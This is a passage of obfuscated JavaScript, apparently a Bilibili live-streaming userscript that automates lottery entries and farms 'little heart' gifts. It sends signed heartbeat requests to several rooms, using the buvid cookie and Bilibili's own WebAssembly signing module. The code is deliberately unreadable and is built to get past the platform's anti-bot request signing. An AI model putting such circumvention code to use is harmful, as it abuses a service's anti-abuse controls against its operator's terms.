_0x2f9a30;}}}else{return{'\x76\x61\x6c\x75\x65':r[_0x44b0('8b','\x4b\x38\x4e\x4f')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}}catch(_0xf35cb3){window['\x74\x6f\x61\x73\x74']('\x5b\u81ea\u52a8\u62bd\u5956\x5d\x5b\u8282\u594f\u98ce\u66b4\x5d\u62bd\u5956\x28\x72\x6f\x6f\x6d\x69\x64\x3d'+_0x1d2755+_0x44b0('8c','\x4f\x78\x6c\x4b')+_0x1b2b7d+'\x2c\x62\x6c\x6f\x63\x6b\x5f\x63\x6f\x75\x6e\x74\x3d'+_0x58a732+_0x44b0('8d','\x51\x25\x5d\x28'),_0x23edb9['\x5a\x41\x57\x54\x79']);console['\x65\x72\x72\x6f\x72'](_0xf35cb3);break;}}return $[_0x44b0('8e','\x4b\x6e\x35\x43')]()['\x72\x65\x73\x6f\x6c\x76\x65']();}};const UUID=()=>_0x44b0('8f','\x6c\x76\x37\x30')[_0x44b0('90','\x29\x67\x5b\x49')](/[xy]/g,function(_0x94d6a9){var _0x1a4fac={'\x4e\x58\x77\x64\x4a':function(_0x56d2eb,_0x26f1ba){return _0x56d2eb|_0x26f1ba;},'\x53\x4b\x73\x6b\x71':function(_0x3e952e,_0x21b251){return _0x3e952e*_0x21b251;},'\x58\x6b\x74\x59\x67':function(_0x213b5b,_0x510589){return _0x213b5b===_0x510589;}};var _0x33ade7=_0x1a4fac[_0x44b0('91','\x4b\x6e\x35\x43')](_0x1a4fac[_0x44b0('92','\x62\x55\x70\x6a')](0x10,Math[_0x44b0('93','\x4a\x51\x76\x65')]()),0x0);return(_0x1a4fac[_0x44b0('94','\x50\x32\x36\x69')]('\x78',_0x94d6a9)?_0x33ade7:_0x1a4fac[_0x44b0('95','\x78\x57\x72\x21')](0x3&_0x33ade7,0x8))[_0x44b0('96','\x4f\x73\x32\x61')](0x10);});class HeartGiftRoom{constructor(_0x5332fe,_0x1f54a2){var _0x385476={'\x78\x70\x4f\x4f\x51':_0x44b0('97','\x29\x67\x5b\x49'),'\x72\x57\x44\x49\x4f':function(_0x5cddc8){return _0x5cddc8();},'\x50\x75\x68\x79\x6d':function(_0xe67541,_0x53d8aa){return _0xe67541(_0x53d8aa);},'\x47\x76\x50\x41\x67':_0x44b0('98','\x50\x32\x36\x69')};var _0x537723=_0x385476[_0x44b0('99','\x51\x25\x5d\x28')][_0x44b0('9a','\x6f\x2a\x51\x6d')]('\x7c'),_0x40f8a9=0x0;while(!![]){switch(_0x537723[_0x40f8a9++]){case'\x30':this['\x74\x6f\x74\x61\x6c\x74\x69\x6d\x65']=0x0;continue;case'\x31':this['\x72\x6f\x6f\x6d\x5f\x69\x64']=_0x5332fe[_0x44b0('9b','\x37\x4f\x5e\x66')];continue;case'\x32':this[_0x44b0('9c','\x78\x57\x72\x21')]=0x0;continue;case'\x33':this[_0x44b0('9d','\x26\x68\x52\x65')]=_0x385476[_0x44b0('9e','\x77\x59\x64\x62')](UUID);continue;case'\x34':this[_0x44b0('9f','\x5a\x55\x6a\x6c')]=_0x5332fe['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64'];continue;case'\x35':this[_0x44b0('a0','\x42\x29\x55\x55')]=_0x5332fe[_0x44b0('a1','\x4b\x31\x4a\x29')];continue;case'\x36':this['\x75\x61']=window&&window[_0x44b0('a2','\x78\x57\x72\x21')]?window[_0x44b0('a3','\x6c\x76\x37\x30')][_0x44b0('a4','\x52\x33\x4e\x68')]:'';continue;case'\x37':this['\x62\x75\x76\x69\x64']=_0x385476[_0x44b0('a5','\x30\x5a\x53\x4e')](getCookie,_0x385476['\x47\x76\x50\x41\x67']);continue;case'\x38':this[_0x44b0('a6','\x45\x25\x78\x72')]=0x0;continue;case'\x39':this['\x6d\x65\x64\x61\x6c']=_0x1f54a2;continue;case'\x31\x30':this[_0x44b0('a7','\x57\x4c\x32\x31')]=new Date();continue;case'\x31\x31':this['\x73\x74\x61\x72\x74\x45\x6e\x74\x65\x72']();continue;case'\x31\x32':;continue;case'\x31\x33':this['\x69\x6e\x66\x6f']=_0x5332fe;continue;}break;}}async[_0x44b0('a8','\x46\x55\x43\x61')](){var _0x2cd051={'\x4d\x52\x75\x4d\x6b':function(_0x4d13a3,_0x1f3b25){return _0x4d13a3>_0x1f3b25;},'\x6c\x54\x67\x57\x78':function(_0x5f3a5f,_0x5001d6){return _0x5f3a5f==_0x5001d6;},'\x4d\x4c\x62\x7a\x4d':function(_0x3855d,_0x156d63,_0x4e30f2){return _0x3855d(_0x156d63,_0x4e30f2);},'\x6e\x6b\x7a\x6d\x62':function(_0x47a78f,_0x25e33a){return _0x47a78f*_0x25e33a;},'\x61\x4f\x43\x6c\x47':function(_0x5c68fe,_0x37bd8f){return _0x5c68fe!==_0x37bd8f;},'\x79\x70\x6a\x75\x74':_0x44b0('a9','\x51\x25\x5d\x28'),'\x51\x52\x42\x45\x78':_0x44b0('aa','\x78\x57\x72\x21'),'\x7a\x45\x6a\x64\x4c':function(_0x2cf51e,_0x5f5b8a,_0x5685c7){return _0x2cf51e(_0x5f5b8a,_0x5685c7);}};try{if(!HeartGift[_0x44b0('ab','\x50\x32\x36\x69')]||_0x2cd051[_0x44b0('ac','\x78\x70\x51\x66')](this['\x65\x72\x72\x6f\x72'],0x3))return;let _0x4c1c91={'\x69\x64':[this['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64'],this[_0x44b0('ad','\x37\x4f\x5e\x66')],this[_0x44b0('ae','\x42\x29\x55\x55')],this[_0x44b0('af','\x47\x57\x24\x42')]],'\x64\x65\x76\x69\x63\x65':[this['\x62\x75\x76\x69\x64'],this['\x75\x75\x69\x64']],'\x74\x73':new Date()[_0x44b0('b0','\x2a\x52\x4c\x7a')](),'\x69\x73\x5f\x70\x61\x74\x63\x68':0x0,'\x68\x65\x61\x72\x74\x5f\x62\x65\x61\x74':[],'\x75\x61':this['\x75\x61']};KeySign[_0x44b0('b1','\x50\x32\x36\x69')](_0x4c1c91);let _0x93093=await BiliPushUtils[_0x44b0('b2','\x45\x25\x78\x72')]['\x48\x65\x61\x72\x74\x47\x69\x66\x74'][_0x44b0('b3','\x66\x50\x57\x25')](_0x4c1c91,this['\x72\x6f\x6f\x6d\x5f\x69\x64']);if(_0x2cd051['\x6c\x54\x67\x57\x78'](_0x93093[_0x44b0('b4','\x29\x5e\x41\x62')],0x0)){var _0x58fef3=_0x44b0('b5','\x39\x7a\x62\x29')[_0x44b0('b6','\x69\x6b\x5e\x48')]('\x7c'),_0x39a466=0x0;while(!![]){switch(_0x58fef3[_0x39a466++]){case'\x30':this['\x65\x74\x73']=_0x93093['\x64\x61\x74\x61'][_0x44b0('b7','\x30\x5a\x53\x4e')];continue;case'\x31':this[_0x44b0('b8','\x47\x57\x24\x42')]=_0x93093['\x64\x61\x74\x61'][_0x44b0('b9','\x4b\x38\x4e\x4f')];continue;case'\x32':this[_0x44b0('ba','\x51\x25\x5d\x28')]+=this[_0x44b0('bb','\x57\x4c\x32\x31')];continue;case'\x33':++this[_0x44b0('bc','\x78\x70\x51\x66')];continue;case'\x34':this[_0x44b0('bd','\x41\x40\x71\x34')]=_0x93093[_0x44b0('be','\x47\x57\x24\x42')]['\x73\x65\x63\x72\x65\x74\x5f\x72\x75\x6c\x65'];continue;case'\x35':this[_0x44b0('bf','\x4b\x61\x72\x62')]=_0x93093['\x64\x61\x74\x61'][_0x44b0('c0','\x46\x55\x43\x61')];continue;}break;}}await _0x2cd051[_0x44b0('c1','\x4b\x61\x72\x62')](delayCall,()=>this[_0x44b0('c2','\x66\x50\x57\x25')](),_0x2cd051[_0x44b0('c3','\x65\x4d\x52\x45')](this['\x74\x69\x6d\x65'],0x3e8));}catch(_0x361311){if(_0x2cd051['\x61\x4f\x43\x6c\x47'](_0x2cd051['\x79\x70\x6a\x75\x74'],_0x2cd051[_0x44b0('c4','\x52\x33\x4e\x68')])){this[_0x44b0('c5','\x47\x57\x24\x42')]++;console[_0x44b0('c6','\x77\x35\x66\x31')](_0x361311);await _0x2cd051[_0x44b0('c7','\x47\x57\x24\x42')](delayCall,()=>this[_0x44b0('c8','\x58\x47\x44\x4e')](),0x3e8);}else{t=Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x74\x6f\x5f\x6a\x73'](t),Module[_0x44b0('c9','\x77\x59\x64\x62')]['\x75\x6e\x72\x65\x67\x69\x73\x74\x65\x72\x5f\x72\x61\x77\x5f\x76\x61\x6c\x75\x65'](t);}}}async['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](){var _0x16742a={'\x4b\x71\x55\x6e\x65':function(_0xfba964,_0x401bd6){return _0xfba964<_0x401bd6;},'\x56\x4e\x66\x75\x44':function(_0x2d5d8c,_0x1e5ec6){return _0x2d5d8c|_0x1e5ec6;},'\x6e\x46\x50\x4d\x47':function(_0x2d9e1b,_0x2ef5aa){return _0x2d9e1b&_0x2ef5aa;},'\x7a\x42\x45\x4d\x68':function(_0x5e248c,_0x35e50a){return _0x5e248c<<_0x35e50a;},'\x44\x43\x49\x54\x54':function(_0x4f46be,_0x5b3e10){return _0x4f46be>>_0x5b3e10;},'\x47\x55\x54\x6e\x6c':_0x44b0('ca','\x26\x68\x52\x65'),'\x65\x76\x68\x6b\x4c':function(_0x5da1b7,_0x3ffd8f){return _0x5da1b7>_0x3ffd8f;},'\x52\x49\x71\x47\x43':function(_0x52e5dd,_0x44743e){return _0x52e5dd===_0x44743e;},'\x4e\x62\x6e\x50\x63':'\x65\x77\x72\x41\x66','\x4c\x64\x43\x66\x5a':function(_0x21fb50,_0x35b481){return _0x21fb50>=_0x35b481;},'\x64\x57\x71\x56\x74':function(_0xbbd23d,_0x47efa7){return _0xbbd23d<=_0x47efa7;},'\x66\x72\x66\x55\x44':function(_0x4050fd,_0x3c2d64){return _0x4050fd===_0x3c2d64;},'\x43\x4f\x52\x79\x48':_0x44b0('cb','\x59\x75\x55\x68'),'\x6d\x46\x55\x52\x63':function(_0x11e66e,_0x1656ee,_0xfb5d9a){return _0x11e66e(_0x1656ee,_0xfb5d9a);},'\x79\x4b\x77\x53\x52':function(_0xd658ea,_0x182898){return _0xd658ea*_0x182898;},'\x46\x70\x66\x63\x41':_0x44b0('cc','\x59\x75\x55\x68'),'\x58\x6e\x78\x70\x6b':function(_0x338c45,_0x44be05){return _0x338c45(_0x44be05);}};try{if(_0x16742a[_0x44b0('cd','\x50\x32\x36\x69')]===_0x16742a[_0x44b0('ce','\x41\x40\x71\x34')]){if(!HeartGift[_0x44b0('cf','\x6e\x6f\x4f\x36')]||_0x16742a[_0x44b0('d0','\x39\x7a\x62\x29')](this[_0x44b0('d1','\x30\x64\x6a\x29')],0x3))return;let _0x476148={'\x69\x64':[this['\x70\x61\x72\x65\x6e\x74\x5f\x61\x72\x65\x61\x5f\x69\x64'],this[_0x44b0('d2','\x59\x75\x55\x68')],this[_0x44b0('d3','\x62\x55\x70\x6a')],this[_0x44b0('d4','\x4f\x73\x32\x61')]],'\x64\x65\x76\x69\x63\x65':[this[_0x44b0('d5','\x47\x50\x4f\x53')],this[_0x44b0('d6','\x29\x67\x5b\x49')]],'\x65\x74\x73':this['\x65\x74\x73'],'\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b':this[_0x44b0('d7','\x58\x47\x44\x4e')],'\x74\x69\x6d\x65':this[_0x44b0('bb','\x57\x4c\x32\x31')],'\x74\x73':new Date()['\x67\x65\x74\x54\x69\x6d\x65'](),'\x75\x61':this['\x75\x61']};KeySign[_0x44b0('d8','\x30\x5a\x53\x4e')](_0x476148);let _0x3158bf=BiliPushUtils['\x73\x69\x67\x6e'](JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](_0x476148),this['\x73\x65\x63\x72\x65\x74\x5f\x72\x75\x6c\x65']);if(_0x3158bf){_0x476148['\x73']=_0x3158bf;let _0x5603f3=await BiliPushUtils[_0x44b0('d9','\x40\x64\x71\x6b')]['\x48\x65\x61\x72\x74\x47\x69\x66\x74']['\x68\x65\x61\x72\x74'](_0x476148,this[_0x44b0('da','\x6c\x76\x37\x30')]);if(_0x5603f3[_0x44b0('db','\x4b\x38\x4e\x4f')]==0x0){if(_0x16742a[_0x44b0('dc','\x30\x5a\x53\x4e')]('\x65\x77\x72\x41\x66',_0x16742a[_0x44b0('dd','\x4b\x38\x4e\x4f')])){if(_0x16742a[_0x44b0('de','\x48\x6c\x29\x64')](this[_0x44b0('df','\x30\x78\x36\x55')],0x12c)){this['\x74\x6f\x74\x61\x6c\x74\x69\x6d\x65']-=0x12c;++HeartGift[_0x44b0('e0','\x59\x75\x55\x68')];}console[_0x44b0('e1','\x30\x78\x36\x55')](_0x44b0('e2','\x4b\x31\x4a\x29')+this['\x6d\x65\x64\x61\x6c'][_0x44b0('e3','\x47\x57\x24\x42')]+_0x44b0('e4','\x50\x32\x36\x69')+this[_0x44b0('e5','\x59\x75\x55\x68')]+_0x44b0('e6','\x4b\x6e\x35\x43')+this[_0x44b0('e7','\x6f\x23\x56\x5b')]+'\x5d\x2c\u5269\u4f59\u65f6\u95f4\x3a\x5b'+(0x12c-this[_0x44b0('e8','\x73\x66\x76\x75')])+_0x44b0('e9','\x6d\x4e\x33\x48')+HeartGift[_0x44b0('ea','\x26\x68\x52\x65')]+'\x5d');++this[_0x44b0('d3','\x62\x55\x70\x6a')];this[_0x44b0('eb','\x35\x75\x5b\x26')]=_0x5603f3['\x64\x61\x74\x61'][_0x44b0('ec','\x47\x50\x4f\x53')];this['\x74\x6f\x74\x61\x6c\x74\x69\x6d\x65']+=this['\x74\x69\x6d\x65'];this[_0x44b0('ed','\x65\x4d\x52\x45')]=_0x5603f3[_0x44b0('ee','\x35\x75\x5b\x26')]['\x73\x65\x63\x72\x65\x74\x5f\x6b\x65\x79'];this['\x65\x74\x73']=_0x5603f3[_0x44b0('ef','\x58\x47\x44\x4e')][_0x44b0('f0','\x59\x75\x55\x68')];this[_0x44b0('f1','\x4b\x6e\x35\x43')]=_0x5603f3[_0x44b0('f2','\x48\x6c\x29\x64')]['\x73\x65\x63\x72\x65\x74\x5f\x72\x75\x6c\x65'];if(_0x16742a[_0x44b0('f3','\x35\x75\x5b\x26')](HeartGift[_0x44b0('f4','\x48\x6c\x29\x64')],HeartGift[_0x44b0('f5','\x41\x40\x71\x34')])&&HeartGift['\x70\x72\x6f\x63\x65\x73\x73']){if(_0x16742a[_0x44b0('f6','\x26\x68\x52\x65')](_0x44b0('f7','\x77\x35\x66\x31'),_0x16742a['\x43\x4f\x52\x79\x48'])){resolve();}else{await _0x16742a[_0x44b0('f8','\x65\x4d\x52\x45')](delayCall,()=>this['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](),_0x16742a['\x79\x4b\x77\x53\x52'](this[_0x44b0('f9','\x51\x25\x5d\x28')],0x3e8));}}else{if(HeartGift[_0x44b0('fa','\x4f\x73\x32\x61')]){if(_0x44b0('fb','\x29\x5e\x41\x62')===_0x16742a[_0x44b0('fc','\x6e\x6f\x4f\x36')]){var _0x3c13a1=Module[_0x44b0('fd','\x6f\x2a\x51\x6d')][_0x44b0('fe','\x30\x64\x6a\x29')](t);Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x5f\x61\x72\x72\x61\x79'](r,_0x3c13a1);}else{console['\x6c\x6f\x67'](_0x44b0('ff','\x41\x40\x71\x34'));HeartGift[_0x44b0('100','\x26\x68\x52\x65')]=![];_0x16742a[_0x44b0('101','\x58\x47\x44\x4e')](runTomorrow,HeartGift[_0x44b0('102','\x52\x33\x4e\x68')]);}}}}else{var _0x32f48f=0x0;if(_0x16742a['\x4b\x71\x55\x6e\x65'](index,end)){_0x32f48f=HEAPU8[index++];}ch=_0x16742a['\x56\x4e\x66\x75\x44'](_0x16742a[_0x44b0('103','\x26\x68\x52\x65')](init,0x7)<<0x12,_0x16742a['\x56\x4e\x66\x75\x44'](_0x16742a[_0x44b0('104','\x47\x50\x4f\x53')](y_z,0x6),_0x16742a[_0x44b0('105','\x6f\x2a\x51\x6d')](_0x32f48f,0x3f)));output+=String[_0x44b0('106','\x2a\x52\x4c\x7a')](0xd7c0+_0x16742a['\x44\x43\x49\x54\x54'](ch,0xa));ch=0xdc00+_0x16742a[_0x44b0('107','\x37\x4f\x5e\x66')](ch,0x3ff);}}}}else{throw new ReferenceError('\x41\x6c\x72\x65\x61\x64\x79\x20\x64\x72\x6f\x70\x70\x65\x64\x20\x52\x75\x73\x74\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x63\x61\x6c\x6c\x65\x64\x21');}}catch(_0x3378f2){this[_0x44b0('108','\x4a\x51\x76\x65')]++;console[_0x44b0('109','\x50\x32\x36\x69')](_0x3378f2);await _0x16742a[_0x44b0('10a','\x47\x50\x4f\x53')](delayCall,()=>this[_0x44b0('10b','\x4b\x31\x4a\x29')](),0x3e8);}}}const HeartGift={'\x74\x6f\x74\x61\x6c':0x0,'\x6d\x61\x78':0x19,'\x70\x72\x6f\x63\x65\x73\x73':!![],'\x72\x75\x6e':async()=>{var _0x27e04f={'\x55\x51\x52\x71\x57':'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x30\x2e\x68\x64\x73\x6c\x62\x2e\x63\x6f\x6d\x2f\x62\x66\x73\x2f\x6c\x69\x76\x65\x2f\x65\x37\x39\x31\x35\x35\x36\x37\x30\x36\x66\x38\x38\x64\x38\x38\x62\x34\x38\x34\x36\x61\x36\x31\x61\x35\x38\x33\x62\x33\x31\x64\x62\x30\x30\x37\x66\x38\x33\x64\x2e\x77\x61\x73\x6d','\x6f\x6c\x4a\x57\x4e':function(_0x1008cc,_0x34758c){return _0x1008cc!==_0x34758c;},'\x5a\x59\x65\x6b\x45':'\x50\x67\x4a\x71\x70','\x76\x57\x48\x6b\x41':_0x44b0('10c','\x78\x57\x72\x21'),'\x58\x55\x57\x7a\x62':_0x44b0('10d','\x26\x68\x52\x65'),'\x55\x48\x6b\x61\x47':'\u5c0f\u5fc3\u5fc3\u6a21\u5757\u7ed1\u5b9a\u5931\u8d25\uff0c\u65e0\u6cd5\u4f7f\u7528','\x4c\x70\x64\x6d\x54':function(_0x74db6f,_0x48a8a5){return _0x74db6f>_0x48a8a5;},'\x45\x54\x43\x4d\x51':_0x44b0('10e','\x58\x47\x44\x4e'),'\x43\x64\x56\x6f\x71':function(_0x5b4dcd,_0x187a1c,_0x3c0bae){return _0x5b4dcd(_0x187a1c,_0x3c0bae);},'\x73\x71\x61\x42\x4b':function(_0xfeebfe,_0x596f38){return _0xfeebfe==_0x596f38;}};if(!HeartGift[_0x44b0('10f','\x6c\x76\x37\x30')]){HeartGift[_0x44b0('110','\x37\x4f\x5e\x66')]=0x0;HeartGift['\x70\x72\x6f\x63\x65\x73\x73']=!![];}if(BiliPushUtils['\x73\x69\x67\x6e']==null){let _0x153680=await HeartGift[_0x44b0('111','\x4b\x6e\x35\x43')](_0x27e04f['\x55\x51\x52\x71\x57'],HeartGift[_0x44b0('112','\x4f\x73\x32\x61')]);if(_0x153680){if(_0x27e04f[_0x44b0('113','\x45\x43\x35\x64')](_0x27e04f[_0x44b0('114','\x47\x57\x24\x42')],_0x27e04f['\x76\x57\x48\x6b\x41'])){BiliPushUtils[_0x44b0('115','\x29\x5e\x41\x62')]=function(_0x4b10bf,_0x5f3ce8){return _0x153680['\x73\x70\x79\x64\x65\x72'](_0x4b10bf,_0x5f3ce8);};}else{r=Module[_0x44b0('116','\x40\x64\x71\x6b')]['\x74\x6f\x5f\x6a\x73'](r),Module[_0x44b0('117','\x69\x71\x55\x67')][_0x44b0('118','\x59\x75\x55\x68')](t,r['\x6c\x65\x6e\x67\x74\x68']);}}else{if(_0x27e04f[_0x44b0('119','\x6c\x76\x37\x30')](_0x44b0('11a','\x45\x43\x35\x64'),_0x27e04f['\x58\x55\x57\x7a\x62'])){pointer=Module[_0x44b0('11b','\x46\x55\x43\x61')][_0x44b0('11c','\x69\x71\x55\x67')](length);Module[_0x44b0('117','\x69\x71\x55\x67')][_0x44b0('11d','\x40\x64\x71\x6b')](value,pointer);}else{console[_0x44b0('11e','\x69\x71\x55\x67')](_0x27e04f[_0x44b0('11f','\x77\x59\x64\x62')]);return;}}}let _0x353281=await Gift[_0x44b0('120','\x6c\x76\x37\x30')]();if(_0x353281&&_0x27e04f[_0x44b0('121','\x4b\x31\x4a\x29')](_0x353281[_0x44b0('122','\x58\x47\x44\x4e')],0x0)){console['\x6c\x6f\x67'](_0x27e04f[_0x44b0('123','\x39\x7a\x62\x29')]);for(let _0x7634a3 of _0x353281[_0x44b0('124','\x51\x25\x5d\x28')](0x0,0x18)){let _0x254979=await API['\x72\x6f\x6f\x6d'][_0x44b0('125','\x4a\x51\x76\x65')](_0x27e04f[_0x44b0('126','\x6f\x2a\x51\x6d')](parseInt,_0x7634a3[_0x44b0('127','\x35\x75\x5b\x26')],0xa));if(_0x27e04f[_0x44b0('128','\x29\x5e\x41\x62')](_0x254979['\x63\x6f\x64\x65'],0x0)){console[_0x44b0('129','\x62\x55\x70\x6a')](_0x44b0('12a','\x46\x55\x43\x61')+_0x7634a3[_0x44b0('12b','\x57\x76\x6e\x6b')]+_0x44b0('12c','\x29\x5e\x41\x62')+_0x254979['\x64\x61\x74\x61']['\x72\x6f\x6f\x6d\x5f\x69\x64']+_0x44b0('12d','\x69\x6b\x5e\x48'));new HeartGiftRoom(_0x254979[_0x44b0('12e','\x77\x35\x66\x31')],_0x7634a3);await _0x27e04f['\x43\x64\x56\x6f\x71'](delayCall,()=>{},0x3e8);}}}},'\x62\x69\x6e\x64\x57\x61\x73\x6d':function(_0xdcd51e,_0x2e30a1){var _0x23ae7d={'\x51\x6f\x79\x46\x4a':function(_0x422aea,_0x486c43){return _0x422aea===_0x486c43;},'\x75\x51\x62\x4a\x57':_0x44b0('12f','\x57\x4c\x32\x31'),'\x46\x42\x49\x44\x6e':function(_0x1e320e,_0x13fd5c){return _0x1e320e!==_0x13fd5c;},'\x64\x50\x4e\x4b\x66':_0x44b0('130','\x6d\x4e\x33\x48'),'\x58\x51\x45\x69\x79':'\x6d\x6a\x4e\x56\x47','\x57\x6f\x78\x54\x6f':_0x44b0('131','\x73\x66\x76\x75'),'\x53\x6a\x66\x6a\x63':'\x45\x72\x72\x6f\x72\x20\x6c\x6f\x61\x64\x69\x6e\x67\x20\x52\x75\x73\x74\x20\x77\x61\x73\x6d\x20\x6d\x6f\x64\x75\x6c\x65','\x68\x73\x52\x47\x47':function(_0xdd6030){return _0xdd6030();},'\x64\x63\x70\x6e\x64':function(_0x1d0c60,_0x1d2dcd,_0x30a389){return _0x1d0c60(_0x1d2dcd,_0x30a389);},'\x6e\x48\x66\x4f\x73':'\x73\x61\x6d\x65\x2d\x6f\x72\x69\x67\x69\x6e','\x6f\x55\x7a\x79\x67':function(_0x3128b6,_0x20f007){return _0x3128b6==_0x20f007;},'\x45\x5a\x46\x43\x57':_0x44b0('132','\x78\x57\x72\x21')};var _0x431076=_0x23ae7d[_0x44b0('133','\x2a\x52\x4c\x7a')](_0x2e30a1),_0x4103c7=_0x23ae7d[_0x44b0('134','\x4b\x6e\x35\x43')](fetch,_0xdcd51e,{'\x63\x72\x65\x64\x65\x6e\x74\x69\x61\x6c\x73':_0x23ae7d[_0x44b0('135','\x58\x47\x44\x4e')]});return(_0x23ae7d[_0x44b0('136','\x40\x64\x71\x6b')](_0x23ae7d[_0x44b0('137','\x78\x70\x51\x66')],typeof window[_0x44b0('138','\x59\x75\x55\x68')]['\x69\x6e\x73\x74\x61\x6e\x74\x69\x61\x74\x65\x53\x74\x72\x65\x61\x6d\x69\x6e\x67'])?window['\x57\x65\x62\x41\x73\x73\x65\x6d\x62\x6c\x79']['\x69\x6e\x73\x74\x61\x6e\x74\x69\x61\x74\x65\x53\x74\x72\x65\x61\x6d\x69\x6e\x67'](_0x4103c7,_0x431076[_0x44b0('139','\x6d\x4e\x33\x48')])[_0x44b0('13a','\x6e\x6f\x4f\x36')](function(_0xdcd51e){if(_0x23ae7d[_0x44b0('13b','\x4b\x31\x4a\x29')](_0x23ae7d[_0x44b0('13c','\x47\x57\x24\x42')],'\x6c\x66\x78\x76\x44')){refid=ref_to_id_map_fallback['\x67\x65\x74'](reference);}else{return _0xdcd51e[_0x44b0('13d','\x4f\x78\x6c\x4b')];}}):_0x4103c7['\x74\x68\x65\x6e'](function(_0xdcd51e){if(_0x23ae7d[_0x44b0('13e','\x4b\x38\x4e\x4f')](_0x23ae7d[_0x44b0('13f','\x48\x6c\x29\x64')],_0x44b0('140','\x35\x75\x5b\x26'))){output['\x64\x72\x6f\x70']();}else{return _0xdcd51e[_0x44b0('141','\x39\x7a\x62\x29')]();}})[_0x44b0('142','\x48\x6c\x29\x64')](function(_0xdcd51e){if(_0x23ae7d[_0x44b0('143','\x2a\x52\x4c\x7a')](_0x23ae7d[_0x44b0('144','\x73\x66\x76\x75')],_0x44b0('145','\x4b\x38\x4e\x4f'))){pointer=Module[_0x44b0('146','\x47\x50\x4f\x53')]['\x61\x6c\x6c\x6f\x63'](length);Module[_0x44b0('147','\x77\x35\x66\x31')][_0x44b0('148','\x4b\x6e\x35\x43')](buffer,pointer);}else{return window[_0x44b0('149','\x29\x67\x5b\x49')][_0x44b0('14a','\x5a\x55\x6a\x6c')](_0xdcd51e);}})[_0x44b0('14b','\x69\x71\x55\x67')](function(_0xdcd51e){var _0x58695f={'\x6a\x50\x4b\x6e\x6c':'\x41\x6c\x72\x65\x61\x64\x79\x20\x63\x61\x6c\x6c\x65\x64\x20\x6f\x72\x20\x64\x72\x6f\x70\x70\x65\x64\x20\x46\x6e\x4f\x6e\x63\x65\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x63\x61\x6c\x6c\x65\x64\x21'};if(_0x44b0('14c','\x47\x57\x24\x42')!==_0x23ae7d[_0x44b0('14d','\x77\x59\x64\x62')]){throw new ReferenceError(_0x58695f['\x6a\x50\x4b\x6e\x6c']);}else{return window['\x57\x65\x62\x41\x73\x73\x65\x6d\x62\x6c\x79'][_0x44b0('14e','\x30\x5a\x53\x4e')](_0xdcd51e,_0x431076[_0x44b0('14f','\x40\x64\x71\x6b')]);}}))[_0x44b0('150','\x66\x50\x57\x25')](function(_0xdcd51e){return _0x431076['\x69\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65'](_0xdcd51e);})['\x63\x61\x74\x63\x68'](function(_0xdcd51e){throw console[_0x44b0('11e','\x69\x71\x55\x67')](_0x23ae7d['\x53\x6a\x66\x6a\x63'],_0xdcd51e),_0xdcd51e;});},'\x77\x61\x73\x6d\x4d\x6f\x64\x65\x6c':function(){var _0x1585d3={'\x75\x4d\x72\x66\x55':function(_0x291343,_0x3bea01){return _0x291343|_0x3bea01;},'\x4a\x58\x61\x4f\x43':function(_0x58a82a,_0x197b6e){return _0x58a82a>>_0x197b6e;},'\x54\x47\x57\x65\x53':function(_0x3fef65,_0x40104d){return _0x3fef65&_0x40104d;},'\x75\x68\x72\x57\x46':function(_0x43c3cf,_0x2c112c){return _0x43c3cf>>_0x2c112c;},'\x64\x56\x73\x72\x69':function(_0x414564,_0x351790){return _0x414564|_0x351790;},'\x65\x64\x75\x73\x77':function(_0xb1ea94,_0xd90474){return _0xb1ea94>>_0xd90474;},'\x4f\x69\x6d\x61\x70':function(_0x519845,_0x1da2ab){return _0x519845!==_0x1da2ab;},'\x59\x47\x73\x61\x61':function(_0x4d9aa3,_0x414bb8){return _0x4d9aa3<_0x414bb8;},'\x71\x42\x79\x55\x7a':function(_0x21d34f,_0x5853e0){return _0x21d34f>=_0x5853e0;},'\x77\x6f\x6c\x55\x41':function(_0x26a400,_0x26db69){return _0x26a400<=_0x26db69;},'\x73\x6a\x51\x49\x42':function(_0x56b20b,_0x5ae21d){return _0x56b20b<<_0x5ae21d;},'\x48\x6c\x69\x4c\x4a':function(_0x37a8e4,_0x1228a8){return _0x37a8e4&_0x1228a8;},'\x74\x75\x7a\x49\x59':function(_0x27b2f1,_0xf2925c){return _0x27b2f1===_0xf2925c;},'\x55\x76\x50\x72\x49':_0x44b0('151','\x4f\x73\x32\x61'),'\x49\x42\x64\x49\x77':function(_0x215f0b,_0x411315){return _0x215f0b|_0x411315;},'\x51\x5a\x4c\x44\x41':function(_0x13f3ee,_0x272167){return _0x13f3ee>>_0x272167;},'\x59\x65\x73\x51\x46':function(_0x15be82,_0x19fd43){return _0x15be82|_0x19fd43;},'\x75\x71\x59\x62\x6e':function(_0x25f3e1,_0xa619c6){return _0x25f3e1<=_0xa619c6;},'\x4b\x6e\x43\x6f\x63':function(_0x23e695,_0x51996c){return _0x23e695!==_0x51996c;},'\x47\x77\x78\x42\x71':function(_0x1c3d8f,_0x3ee650){return _0x1c3d8f|_0x3ee650;},'\x55\x76\x62\x6a\x78':function(_0x491dda,_0x2d8df4){return _0x491dda&_0x2d8df4;},'\x63\x64\x49\x59\x51':function(_0x2c38c1,_0x3a3111){return _0x2c38c1|_0x3a3111;},'\x56\x6d\x6c\x51\x79':_0x44b0('152','\x46\x55\x43\x61'),'\x68\x43\x7a\x41\x6b':_0x44b0('153','\x29\x5e\x41\x62'),'\x57\x56\x4d\x50\x61':function(_0x163eb5,_0x3f444b){return _0x163eb5|_0x3f444b;},'\x6a\x62\x56\x61\x53':function(_0x23af61,_0x1c14dd){return _0x23af61&_0x1c14dd;},'\x76\x72\x48\x5a\x48':function(_0x4d7db7,_0x25f29e){return 